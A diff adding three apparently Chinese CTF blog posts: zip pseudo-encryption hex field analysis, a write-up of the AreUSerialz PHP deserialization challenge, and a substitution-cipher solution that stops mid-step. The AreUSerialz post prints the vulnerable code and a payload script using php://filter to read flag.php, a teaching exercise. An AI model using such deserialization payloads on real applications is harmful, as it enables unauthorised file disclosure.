@@ -73,6 +73,222 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-zip伪加密学习，压缩包16进制数据含义分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/02/02/zip%E4%BC%AA%E5%8A%A0%E5%AF%86%E5%AD%A6%E4%B9%A0%EF%BC%8C%E5%8E%8B%E7%BC%A9%E5%8C%8516%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E5%90%AB%E4%B9%89%E5%88%86%E6%9E%90/" class="article-date">
+  <time class="dt-published" datetime="2025-02-02T07:36:46.168Z" itemprop="datePublished">2025-02-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="zip伪加密学习，压缩包16进制数据含义分析"><a href="#zip伪加密学习，压缩包16进制数据含义分析" class="headerlink" title="zip伪加密学习，压缩包16进制数据含义分析"></a>zip伪加密学习，压缩包16进制数据含义分析</h1><p>一个zip文件由三部分组成：   </p>
+<p> <strong>1.压缩源文件数据区</strong>  </p>
+<p><strong>2.压缩源文件目录区</strong>  </p>
+<p><strong>3.压缩源文件目录结束标志</strong>  </p>
+<p>在ctf.show当中_萌新杂项6中的压缩包为例，用010 editor打开。<br></p>
+<p>如下图中，<br></p>
+<p>前面的灰色背景的十六进制数字为<strong>压缩源文件数据区</strong>。<br></p>
+<p>中间紫色背景的十六进制数字为<strong>压缩源文件目录区</strong>。<br></p>
+<p>后面的黄色背景的十六进制数字为<strong>压缩源文件目录结束标志</strong>。<br></p>
+<p>![](C:\Users\29901\Pictures\Screenshots\屏幕截图 2025-01-26 172336.png)</p>
+<br>
+
+<p>本次将着重介绍压缩源文件目录区  </p>
+<p>50 4B 01 02：<strong>目录中文件文件头标记</strong>  </p>
+<p>![](C:\Users\29901\Pictures\Screenshots\屏幕截图 2025-01-26 172336.png)</p>
+<br>
+
+<p>1F 00:<strong>压缩使用的pkware版本</strong>  </p>
+<p>![](C:\Users\29901\Pictures\Screenshots\屏幕截图 2025-01-26 172519.png)</p>
+<br>
+
+<p>14 00:解压文件所需的pkware版本</p>
+<p>![](C:\Users\29901\Pictures\Screenshots\屏幕截图 2025-01-26 172530.png)</p>
+<br>
+
+<p>此处是伪加密应该将09改为00</p>
+<p>00 00：<strong>全局方式位标记（有无加密，伪加密的关键）目录文件头标记后4bytes</strong>。 </p>
+<p>![](C:\Users\29901\Pictures\Screenshots\屏幕截图 2025-01-26 172547.png)</p>
+<br>
+
+<p>08 00:<strong>压缩方式</strong>  </p>
+<p>![](C:\Users\29901\Pictures\Screenshots\屏幕截图 2025-01-26 172602.png)</p>
+<br>
+
+<p>DC 01:<strong>最后修改文件的时间</strong>  </p>
+<p>![](C:\Users\29901\Pictures\Screenshots\屏幕截图 2025-01-26 172613.png)</p>
+<br>
+
+<p>53 50:<strong>最后修改文件日期</strong>  </p>
+<p>![](C:\Users\29901\Pictures\Screenshots\屏幕截图 2025-01-26 172628.png)</p>
+<br>
+
+<p>D0 EB AE BF:<strong>CRC-32校验</strong>  </p>
+<p>![](C:\Users\29901\Pictures\Screenshots\屏幕截图 2025-01-26 172650.png)</p>
+<br>
+
+<p>15 00 00 00:<strong>压缩后尺寸</strong>  </p>
+<p>![](C:\Users\29901\Pictures\Screenshots\屏幕截图 2025-01-26 172702.png)</p>
+<br>
+
+<p>13 00 00 00:<strong>未压缩尺寸</strong>  </p>
+<p>![](C:\Users\29901\Pictures\Screenshots\屏幕截图 2025-01-26 172714.png)</p>
+<br>
+
+<p>08 00:<strong>文件名长度</strong>  </p>
+<p>![](C:\Users\29901\Pictures\Screenshots\屏幕截图 2025-01-26 172725.png)</p>
+<br>
+
+<p>24 00:<strong>扩展字段长度</strong>  </p>
+<p>![](C:\Users\29901\Pictures\Screenshots\屏幕截图 2025-01-26 172734.png)</p>
+<br>
+
+<p>00 00 :<strong>文件注释长度</strong>  </p>
+<p>![](C:\Users\29901\Pictures\Screenshots\屏幕截图 2025-01-26 172750.png)</p>
+<br>
+
+<p>00 00 :<strong>磁盘开始号</strong>  </p>
+<p>![](C:\Users\29901\Pictures\Screenshots\屏幕截图 2025-01-26 172800.png)</p>
+<br>
+
+<p>00 00:<strong>内部文件属性</strong>  </p>
+<p>![](C:\Users\29901\Pictures\Screenshots\屏幕截图 2025-01-26 172816.png)</p>
+<br>
+
+<p>20 00 00 00:<strong>外部文件属性</strong>  </p>
+<p>![](C:\Users\29901\Pictures\Screenshots\屏幕截图 2025-01-26 172827.png)</p>
+<br>
+
+<p>00 00 00 00:<strong>局部头部偏移量</strong>  </p>
+<p>![](C:\Users\29901\Pictures\Screenshots\屏幕截图 2025-01-26 172842.png)</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/02/02/zip%E4%BC%AA%E5%8A%A0%E5%AF%86%E5%AD%A6%E4%B9%A0%EF%BC%8C%E5%8E%8B%E7%BC%A9%E5%8C%8516%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E5%90%AB%E4%B9%89%E5%88%86%E6%9E%90/" data-id="cm6nbjcf40000ksus4cy73gwp" data-title="" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-[网鼎杯 2020 青龙组]AreUSerialz 解题思路&amp;过程" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/19/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5DAreUSerialz%20%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF&%E8%BF%87%E7%A8%8B/" class="article-date">
+  <time class="dt-published" datetime="2025-01-19T15:03:28.666Z" itemprop="datePublished">2025-01-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="网鼎杯-2020-青龙组-AreUSerialz-解题思路-过程"><a href="#网鼎杯-2020-青龙组-AreUSerialz-解题思路-过程" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz 解题思路&amp;过程"></a>[网鼎杯 2020 青龙组]AreUSerialz 解题思路&amp;过程</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op = &quot;1&quot;;</span><br><span class="line">        $filename = &quot;/tmp/tmpfile&quot;;</span><br><span class="line">        $content = &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i = 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[&#x27;str&#x27;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>is_valid()</code>函数对传入的字符串进行判断，确保每一个字符ASCII码值都在32-125，即该函数的作用是确保参数字符串的每一个字符都是可打印的，才返回true。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[&#x27;str&#x27;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>该段代码首先通过get方法获得字符串str，若str中没有不可打印的字符串后，对字符串执行反序列化操作。因此我们再看一遍FileHandler类中的内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op = &quot;1&quot;;</span><br><span class="line">        $filename = &quot;/tmp/tmpfile&quot;;</span><br><span class="line">        $content = &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>于是我们发现，若想读取flag，需要绕过<code>process()</code>方法的判断，防止op被置一。于是可以传入一个<strong>数字2</strong>，绕过process()方法的判断。于是我们构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">	class FileHandler &#123;</span><br><span class="line">        protected $op = 2;</span><br><span class="line">        protected $filename = &quot;php://filter/read=convert.base64-encode/resource=d:\\phpstudy_pro\\WWW\\flag.php&quot;;</span><br><span class="line">        protected $content;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = new FileHandler();</span><br><span class="line">        $b = serialize($a);</span><br><span class="line">        echo($b);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>利用以下payload可以读到flag。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">	class FileHandler &#123;</span><br><span class="line">        public $op = 2;</span><br><span class="line">        public $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">        public $content;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = new FileHandler();</span><br><span class="line">        $b = serialize($a);</span><br><span class="line">        echo($b);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/19/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84]AreUSerialz%20%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF&%E8%BF%87%E7%A8%8B/" data-id="cm63qze2v0000hous0bn10bbz" data-title="" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2016全国大学生信息安全竞赛" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/19/2016%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/" class="article-date">
+  <time class="dt-published" datetime="2025-01-19T13:57:37.089Z" itemprop="datePublished">2025-01-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/01/19/2016%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/">破译</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="2016全国大学生信息安全竞赛"><a href="#2016全国大学生信息安全竞赛" class="headerlink" title="2016全国大学生信息安全竞赛"></a>2016全国大学生信息安全竞赛</h1><h2 id="一、题目"><a href="#一、题目" class="headerlink" title="一、题目"></a>一、题目</h2><p>破译以下密文：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> TW5650Y - 0TS UZ50S S0V LZW UZ50WKW 9505KL4G 1X WVMUSL510 S001M0UWV 910VSG S0 WFLW0K510 1X LZW54 WF5KL50Y 2S4L0W4KZ52 L1 50U14214SLW X5L0WKK S0V TSK7WLTS88 VWNW8129W0L 50 W8W9W0LS4G, 95VV8W S0V Z5YZ KUZ118K SU41KK UZ50S.LZW S001M0UW9W0L ESK 9SVW SL S K5Y050Y UW4W910G L1VSG TG 0TS UZ50S UW1 VSN5V KZ1W9S7W4 S0V FM LS1, V54WUL14 YW0W4S8 1X LZW 50LW40SL510S8 U112W4SL510 S0V WFUZS0YW VW2S4L9W0L 1X LZW 9505KL4G 1X WVMUSL510.</span><br><span class="line">&quot;EW S4W WFU5LWV L1 T41SVW0 1M4 2S4L0W4KZ52 E5LZ LZW 9505KL4G 1X WVMUSL510 L1 9S7W S 810Y-8SKL50Y 592SUL 10 LZW 85NWK 1X UZ50WKW KLMVW0LK LZ41MYZ S 6150L8G-VWK5Y0WV TSK7WLTS88 UM445UM8M9 S0V S E5VW 4S0YW 1X KUZ118 TSK7WLTS88 241Y4S9K,&quot; KS5V KZ1W9S7W4. &quot;LZ5K U1995L9W0L 9S47K S01LZW4 958WKL10W 50 LZW 0TS&#x27;K G1MLZ S0V TSK7WLTS88 VWNW8129W0L WXX14LK 50 UZ50S.&quot; X8SY &#123; YK182V9ZUL9STU5V&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="二、-Write-up"><a href="#二、-Write-up" class="headerlink" title="二、 Write up"></a>二、 Write up</h2><p>1.我们仔细观察可以发现末尾的代码，很想flag的形式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X8SY &#123; YK182V9ZUL9STU5V&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们假设X8SY对应的是FLAG，即X-F，8-L，S-A，Y-G。</p>
+<p>可以总结为简单的凯撒移位密码，‘X’到‘F’位移了18.</p>
+<p>先替换，得到结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BE5650G - 0BA CH50A A0D THE CH50ESE 9505ST4O 1F EDUCAT510 A001U0CED 910DAO A0 ENTE0S510 1F THE54 EN5ST50G 2A4T0E4SH52 T1 50C14214ATE F5T0ESS A0D BAS7ETBA88 DEVE8129E0T 50 E8E9E0TA4O, 95DD8E A0D H5GH SCH118S AC41SS CH50A.THE A001U0CE9E0T MAS 9ADE AT A S5G050G CE4E910O T1DAO BO 0BA CH50A CE1 DAV5D SH1E9A7E4 A0D NU TA1, D54ECT14 GE0E4A8 1F THE 50TE40AT510A8 C112E4AT510 A0D ENCHA0GE DE2A4T9E0T 1F THE 9505ST4O 1F EDUCAT510.</span><br><span class="line">&quot;ME A4E ENC5TED T1 B41ADE0 1U4 2A4T0E4SH52 M5TH THE 9505ST4O 1F EDUCAT510 T1 9A7E A 810G-8AST50G 592ACT 10 THE 85VES 1F CH50ESE STUDE0TS TH41UGH A 6150T8O-DES5G0ED BAS7ETBA88 CU445CU8U9 A0D A M5DE 4A0GE 1F SCH118 BAS7ETBA88 241G4A9S,&quot; SA5D SH1E9A7E4. &quot;TH5S C1995T9E0T 9A47S A01THE4 958EST10E 50 THE 0BA&#x27;S O1UTH A0D BAS7ETBA88 DEVE8129E0T EFF14TS 50 CH50A.&quot; F8AG &#123; GS182D9HCT9ABC5D&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>2.尝试替换数字8</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BE5650G - 0BA CH50A A0D THE CH50ESE 9505ST4O 1F EDUCAT510 A001U0CED 910DAO A0 ENTE0S510 1F THE54 EN5ST50G 2A4T0E4SH52 T1 50C14214ATE F5T0ESS A0D BAS7ETBALL DEVEL129E0T 50 ELE9E0TA4O, 95DDLE A0D H5GH SCH11LS AC41SS CH50A.THE A001U0CE9E0T MAS 9ADE AT A S5G050G CE4E910O T1DAO BO 0BA CH50A CE1 DAV5D SH1E9A7E4 A0D NU TA1, D54ECT14 GE0E4AL 1F THE 50TE40AT510AL C112E4AT510 A0D ENCHA0GE DE2A4T9E0T 1F THE 9505ST4O 1F EDUCAT510.</span><br><span class="line">&quot;ME A4E ENC5TED T1 B41ADE0 1U4 2A4T0E4SH52 M5TH THE 9505ST4O 1F EDUCAT510 T1 9A7E A L10G-LAST50G 592ACT 10 THE L5VES 1F CH50ESE STUDE0TS TH41UGH A 6150TLO-DES5G0ED BAS7ETBALL CU445CULU9 A0D A M5DE 4A0GE 1F SCH11L BAS7ETBALL 241G4A9S,&quot; SA5D SH1E9A7E4. &quot;TH5S C1995T9E0T 9A47S A01THE4 95LEST10E 50 THE 0BA&#x27;S O1UTH A0D BAS7ETBALL DEVEL129E0T EFF14TS 50 CH50A.&quot; FLAG &#123; GS1L2D9HCT9ABC5D&#125;```</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>3.继续观察，尝试替换数字0</p>
+<p>根据出现的A0D、STUDE0TS，猜测并替换0为N。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BE565NG - NBA CH5NA AND THE CH5NESE 95N5ST4O 1F EDUCAT51N ANN1UNCED 91NDAO AN ENTENS51N 1F THE54 EN5ST5NG 2A4TNE4SH52 T1 5NC14214ATE F5TNESS AND BAS7ETBALL DEVEL129ENT 5N ELE9ENTA4O, 95DDLE AND H5GH SCH11LS AC41SS CH5NA.THE ANN1UNCE9ENT MAS 9ADE AT A S5GN5NG CE4E91NO T1DAO BO NBA CH5NA CE1 DAV5D SH1E9A7E4 AND NU TA1, D54ECT14 GENE4AL 1F THE 5NTE4NAT51NAL C112E4AT51N AND ENCHANGE DE2A4T9ENT 1F THE 95N5ST4O 1F EDUCAT51N.</span><br><span class="line">&quot;ME A4E ENC5TED T1 B41ADEN 1U4 2A4TNE4SH52 M5TH THE 95N5ST4O 1F EDUCAT51N T1 9A7E A L1NG-LAST5NG 592ACT 1N THE L5VES 1F CH5NESE STUDENTS TH41UGH A 615NTLO-DES5GNED BAS7ETBALL CU445CULU9 AND A M5DE 4ANGE 1F SCH11L BAS7ETBALL 241G4A9S,&quot; SA5D SH1E9A7E4. &quot;TH5S C1995T9ENT 9A47S AN1THE4 95LEST1NE 5N THE NBA&#x27;S O1UTH AND BAS7ETBALL DEVEL129ENT EFF14TS 5N CH5NA.&quot; FLAG &#123; GS1L2D9HCT9ABC5D&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>4.尝试替换数字5</p>
+<p>根据文中出现的CH5NA、CH5NESE、F5TNESS，猜测并替换5为字母I。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BEI6ING - NBA CHINA AND THE CHINESE 9INIST4O 1F EDUCATI1N ANN1UNCED 91NDAO AN ENTENSI1N 1F THEI4 ENISTING 2A4TNE4SHI2 T1 INC14214ATE FITNESS AND BAS7ETBALL DEVEL129ENT IN ELE9ENTA4O, 9IDDLE AND HIGH SCH11LS AC41SS CHINA.THE ANN1UNCE9ENT MAS 9ADE AT A SIGNING CE4E91NO T1DAO BO NBA CHINA CE1 DAVID SH1E9A7E4 AND NU TA1, DI4ECT14 GENE4AL 1F THE INTE4NATI1NAL C112E4ATI1N AND ENCHANGE DE2A4T9ENT 1F THE 9INIST4O 1F EDUCATI1N.</span><br><span class="line">&quot;ME A4E ENCITED T1 B41ADEN 1U4 2A4TNE4SHI2 MITH THE 9INIST4O 1F EDUCATI1N T1 9A7E A L1NG-LASTING I92ACT 1N THE LIVES 1F CHINESE STUDENTS TH41UGH A 61INTLO-DESIGNED BAS7ETBALL CU44ICULU9 AND A MIDE 4ANGE 1F SCH11L BAS7ETBALL 241G4A9S,&quot; SAID SH1E9A7E4. &quot;THIS C199IT9ENT 9A47S AN1THE4 9ILEST1NE IN THE NBA&#x27;S O1UTH AND BAS7ETBALL DEVEL129ENT EFF14TS IN CHINA.&quot; FLAG &#123; GS1L2D9HCT9ABCID&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>5.尝试替换数字9为M</p>
